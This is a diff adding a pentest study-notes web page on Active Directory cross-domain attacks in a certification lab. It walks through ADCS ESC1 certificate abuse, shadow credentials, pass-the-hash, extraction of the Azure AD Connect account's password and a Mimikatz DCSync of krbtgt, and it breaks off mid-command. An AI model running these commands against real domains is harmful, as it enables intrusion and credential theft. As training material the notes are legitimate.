@@ -1,0 +1,1112 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>4 - Cross Domain Attacks |</title>
+<meta name="description" content="ADCS, Shadow Credentials, Azure AD Integration, Foreign Security Principals and More ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="4 - Cross Domain Attacks">
+<meta property="og:url" content="http://localhost:4000/notes/crte/cross/">
+
+
+  <meta property="og:description" content="ADCS, Shadow Credentials, Azure AD Integration, Foreign Security Principals and More ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header6.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-12-30T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/crte/cross/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header6.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          4 - Cross Domain Attacks
+
+        
+      </h1>
+      
+        <p class="page__lead">ADCS, Shadow Credentials, Azure AD Integration, Foreign Security Principals and More
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  10 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/" class="active">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="4 - Cross Domain Attacks">
+    <meta itemprop="description" content="ADCS, Shadow Credentials, Azure AD Integration, Foreign Security Principals and More">
+    <meta itemprop="datePublished" content="2023-12-30T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#adcs">ADCS</a>
+    <ul>
+      <li><a href="#escalation">Escalation</a></li>
+      <li><a href="#escalation-to-da">Escalation to DA</a></li>
+      <li><a href="#escalation-to-ea">Escalation to EA</a></li>
+    </ul>
+  </li>
+  <li><a href="#shadow-credentials">Shadow Credentials</a>
+    <ul>
+      <li><a href="#abusing-user-object">Abusing User Object</a></li>
+      <li><a href="#abusing-computer-object">Abusing Computer Object</a></li>
+    </ul>
+  </li>
+  <li><a href="#azure-ad-integration">Azure AD Integration</a>
+    <ul>
+      <li><a href="#phs">PHS</a></li>
+    </ul>
+  </li>
+  <li><a href="#forest-root">Forest Root</a></li>
+  <li><a href="#kerberoast-across-forest-trusts">Kerberoast across Forest Trusts</a></li>
+  <li><a href="#delegations">Delegations</a>
+    <ul>
+      <li><a href="#constrained-delegation-with-protocol-transition">Constrained Delegation with Protocol Transition</a></li>
+      <li><a href="#unconstrained-delegation">Unconstrained Delegation</a></li>
+    </ul>
+  </li>
+  <li><a href="#across-forest-using-trust-tickets">Across Forest using Trust Tickets</a></li>
+  <li><a href="#trust-abuse-mssql-servers">Trust Abuse (MSSQL Servers)</a></li>
+  <li><a href="#foreign-security-principals">Foreign Security Principals</a></li>
+  <li><a href="#abusing-pam-trust">Abusing PAM Trust</a></li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<h1 id="adcs">ADCS</h1>
+
+<p>Active Directory Certificate Services (AD CS) enables use of Public Key Infrastructure (PKI) in active directory forest.</p>
+
+<blockquote>
+  <p>AD CS helps in authenticating users and machines, encrypting and signing documents, filesystem, emails and more.</p>
+</blockquote>
+
+<blockquote>
+  <p><em>AD CS is the Server Role that allows you to build a public key infrastructure (PKI) and provide public key cryptography, digital certificates, and digital signature capabilities for your organization</em>.</p>
+</blockquote>
+
+<ul>
+  <li><strong>CA</strong> - The certification authority that issues certificates. The server with AD CS role (DC or separate) is the CA.</li>
+  <li><strong>Certificate</strong> - Issued to a user or machine and can be used for authentication, encryption, signing etc.</li>
+  <li><strong>CSR</strong> - Certificate Signing Request made by a client to the CA to request a certificate.</li>
+  <li><strong>Certificate Template</strong> - Defines settings for a certificate. Contains information like - enrolment permissions, EKUs, expiry etc.</li>
+  <li><strong>EKU OIDs</strong> - Extended Key Usages Object Identifiers. These dictate the use of a certificate template (Client authentication, Smart Card Logon, SubCA etc.)</li>
+</ul>
+
+<p>We can use the Certify tool to enumerate (and for other attacks) AD CS in the target forest:</p>
+
+<p><a href="https://github.com/GhostPack/Certify">Certify on GitHub</a></p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Certify.exe</span><span class="w"> </span><span class="nx">cas</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Enumerate the templates:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Enumerate vulnerable templates:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">/vulnerable</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Common requirements/misconfigurations for all the Escalations:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- CA grants normal/low-privileged users enrollment rights
+- Manager approval is disabled
+- Authorization signatures are not required
+- The target template grants normal/low-privileged users enrollment rights
+</code></pre></div></div>
+
+<h2 id="escalation">Escalation</h2>
+
+<ul>
+  <li>In techcorp, the user pawadmin has enrollment rights to a template <strong>-ForAdminsofPrivilegedAccessWorkstations</strong></li>
+  <li>The template has <strong>ENROLLEE_SUPPLIES_SUBJECT</strong> value for msPKI-Certificates-Name-Flag. (<strong>ESC1</strong>)</li>
+  <li>This means pawadmin can request certificate for ANY user.</li>
+</ul>
+
+<p>Note that this does not show up when we enumerate vulnerable templates in Certify. Use:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w">
+</span><span class="n">Certify.exe</span><span class="w"> </span><span class="nx">find</span><span class="w"> </span><span class="nx">/enrolleeSuppliesSubject</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>We have the certificate of pawadmin that we extracted from us-jump. (<strong>THEFT4</strong>)</li>
+</ul>
+
+<p>Use the certificate to request a TGT for pawadmin and inject it:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:pawadmin</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\pawadmin.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="escalation-to-da">Escalation to DA</h2>
+
+<p>Request a certificate for DA!</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA</span><span class="w"> </span><span class="nx">/template:ForAdminsofPrivilegedAccessWorkstations</span><span class="w"> </span><span class="nx">/altname:Administrator</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Convert from cert.pem to pfx:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\openssl\openssl.exe</span><span class="w"> </span><span class="nx">pkcs12</span><span class="w"> </span><span class="nt">-in</span><span class="w"> </span><span class="nx">C:\AD\Tools\cert.pem</span><span class="w"> </span><span class="nt">-keyex</span><span class="w"> </span><span class="nt">-CSP</span><span class="w"> </span><span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span><span class="w"> </span><span class="nt">-export</span><span class="w"> </span><span class="nt">-out</span><span class="w"> </span><span class="nx">C:\AD\Tools\DA.pfx</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Request DA TGT and inject it:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\DA.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="escalation-to-ea">Escalation to EA</h2>
+
+<p>Request a certificate for EA!</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">/ca:Techcorp-DC.techcorp.local\TECHCORP-DC-CA</span><span class="w"> </span><span class="nx">/template:ForAdminsofPrivilegedAccessWorkstations</span><span class="w"> </span><span class="nx">/altname:Administrator</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Convert from cert.pem to pfx:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\openssl\openssl.exe</span><span class="w"> </span><span class="nx">pkcs12</span><span class="w"> </span><span class="nt">-in</span><span class="w"> </span><span class="nx">C:\AD\Tools\cert.pem</span><span class="w"> </span><span class="nt">-keyex</span><span class="w"> </span><span class="nt">-CSP</span><span class="w"> </span><span class="s2">"Microsoft Enhanced Cryptographic Provider v1.0"</span><span class="w"> </span><span class="nt">-export</span><span class="w"> </span><span class="nt">-out</span><span class="w"> </span><span class="nx">C:\AD\Tools\EA.pfx</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Request EA TGT and inject it:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:techcorp.local\Administrator</span><span class="w"> </span><span class="nx">/dc:techcorp-dc.techcorp.local</span><span class="w"> </span><span class="nx">/certificate:C:\AD\Tools\EA.pfx</span><span class="w"> </span><span class="nx">/password:SecretPass</span><span class="err">@</span><span class="nx">123</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w"> </span><span class="nx">/ptt</span><span class="w">
+</span></code></pre></div></div>
+
+<h1 id="shadow-credentials">Shadow Credentials</h1>
+
+<p>Users and Computers have <strong>msDS-KeyCredentialLink</strong> attribute that contains the raw public keys of certificate that can be used as an alternate credential.</p>
+
+<ul>
+  <li>This attribute is used when we configure Windows Hello for Business (WHfB)</li>
+</ul>
+
+<blockquote>
+  <p>By default, Key Admins and Enterprise Key Admins have rights to modify the <strong>msDS-KeyCredentialLink attribute</strong>.</p>
+</blockquote>
+
+<ul>
+  <li>User to User (U2U) Service Ticket can be requested to decrypt the encrypted <strong>NTLM_SUPPLEMENTAL_CREDENTIAL</strong> entity from Privilege Attribute Certificate (PAC) and extract NTLM hash.</li>
+</ul>
+
+<p>Pre-requisites to abuse Shadow Credentials:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- AD CS (Key Trust if AD CS is not present)
+- Support for PKINIT and at least one DC with Windows Server 2016 or above.
+- Permissions (GenericWrite/GenericAll) to modify the msDS-KeyCredentialLink attribute of the target object.
+</code></pre></div></div>
+
+<h2 id="abusing-user-object">Abusing User Object</h2>
+
+<p>Enumerate the permissions:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"StudentUsers"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Add the Shadow Credential:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Whisker.exe</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">/target:supportXuser</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Using PowerView, see if the Shadow Credential is added.</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">supportXuser</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Request the TGT by leveraging the certificate:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:supportXuser</span><span class="w"> </span><span class="nx">/certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCW....</span><span class="w"> </span><span class="nx">/password:</span><span class="s2">"1OT0qAom3..."</span><span class="w"> </span><span class="nx">/domain:us.techcorp.local</span><span class="w"> </span><span class="nx">/dc:US-DC.us.techcorp.local</span><span class="w"> </span><span class="nx">/getcredentials</span><span class="w"> </span><span class="nx">/show</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Inject the TGT in the current session or use the NTLM hash:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">ptt</span><span class="w"> </span><span class="nx">/ticket:doIGgDCCBnygAwIBBaEDAgEW...</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="abusing-computer-object">Abusing Computer Object</h2>
+
+<p>Enumerate the permissions:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Find-InterestingDomainAcl</span><span class="w"> </span><span class="nt">-ResolveGUIDs</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">IdentityReferenceName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s1">'mgmtadmin’}
+</span></code></pre></div></div>
+
+<p>Add the Shadow Credentials:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\AD\Tools\SafetyKatz.exe</span><span class="w"> </span><span class="s2">"sekurlsa::pth /user:mgmtadmin /domain:us.techcorp.local /aes256:32827622ac4357bcb476ed3ae362f9d3e7d27e292eb27519d2b8b419db24c00f /run:cmd.exe"</span><span class="w"> </span><span class="s2">"exit"</span><span class="w">
+</span><span class="n">Whisker.exe</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">/target:us-helpdesk</span><span class="err">$</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Using PowerView, see if the Shadow Credential is added:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="nx">us-helpdesk</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Request the TGT by leveraging the certificate:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:us-helpdesk</span><span class="err">$</span><span class="w"> </span><span class="nx">/certificate:MIIJ0AIBAzCCCYwGCSqGSIb...</span><span class="w"> </span><span class="nx">/password:</span><span class="s2">"ViGFoZJa..."</span><span class="w"> </span><span class="nx">/domain:us.techcorp.local</span><span class="w"> </span><span class="nx">/dc:US-DC.us.techcorp.local</span><span class="w"> </span><span class="nx">/getcredentials</span><span class="w"> </span><span class="nx">/show</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Request and Inject the TGS by impersonating the user:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/dc:us-dc.us.techcorp.local</span><span class="w"> </span><span class="nx">/ticket:doIGkDCCBoygAwIBBaEDAgEW...</span><span class="w"> </span><span class="nx">/impersonateuser:administrator</span><span class="w"> </span><span class="nx">/ptt</span><span class="w"> </span><span class="nx">/self</span><span class="w"> </span><span class="nx">/altservice:cifs/us-helpdesk</span><span class="w">
+</span></code></pre></div></div>
+
+<h1 id="azure-ad-integration">Azure AD Integration</h1>
+
+<p>Azure AD is a popular method to extend identity management from on-premises AD to Microsoft’s Azure offerings.</p>
+
+<ul>
+  <li>Many enterprises use their on-prem AD identities to access Azure applications.</li>
+</ul>
+
+<blockquote>
+  <p>A single user identity for authentication and authorization to all resources, regardless of location is hybrid identity.</p>
+</blockquote>
+
+<p>An on-premises AD can be integrated with Azure AD using Azure AD Connect with the following methods:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- Password Hash Sync (PHS)
+- Pass-Through Authentication (PTA)
+- Federation
+</code></pre></div></div>
+
+<blockquote>
+  <p>Azure AD Connect is installed on-premises and has a high privilege account both in on AD and Azure AD!</p>
+</blockquote>
+
+<h2 id="phs">PHS</h2>
+
+<blockquote>
+  <p>Let’s target PHS.</p>
+</blockquote>
+
+<ul>
+  <li>It shares users and their password hashes from on-premises AD to Azure AD.</li>
+  <li>A new users <strong>MSOL_</strong> is created which has Synchronization rights (DCSync) on the domain!</li>
+</ul>
+
+<p><img src="/assets/images/posts/crte/3.png" alt="Alt text" class="align-center" /></p>
+
+<p><strong>Enumerate the PHS account and server where AD Connect is installed</strong></p>
+
+<p>Using PowerView:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-DomainUser</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s2">"MSOL_*"</span><span class="w"> </span><span class="nt">-Domain</span><span class="w"> </span><span class="nx">techcorp.local</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Using the ActiveDirectory module:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADUser</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s2">"samAccountName -like 'MSOL_*'"</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="nx">techcorp.local</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">SamAccountName</span><span class="p">,</span><span class="nx">Description</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">fl</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>We already have administrative access to us-adconnect as helpdeskadmin.</p>
+</blockquote>
+
+<p>With administrative privileges, if we run adconnect.ps1, we can extract the credentials of the MSOL_ account used by AD Connect in clear-text:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="n">\adconnect.ps1</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>[Note] The above script’s code runs powershell.exe so verbose logs (like transcripts) will be there.</p>
+</blockquote>
+
+<p>With the password, we can run commands as <strong>MSOL_</strong>:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">runas</span><span class="w"> </span><span class="nx">/user:techcorp.local\MSOL_16fb75d0227d</span><span class="w"> </span><span class="nx">/netonly</span><span class="w"> </span><span class="nx">cmd</span><span class="w">
+</span></code></pre></div></div>
+
+<p>And can then execute the DCSync attack:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s1">'"lsadump::dcsync /user:us\krbtgt"'</span><span class="w">
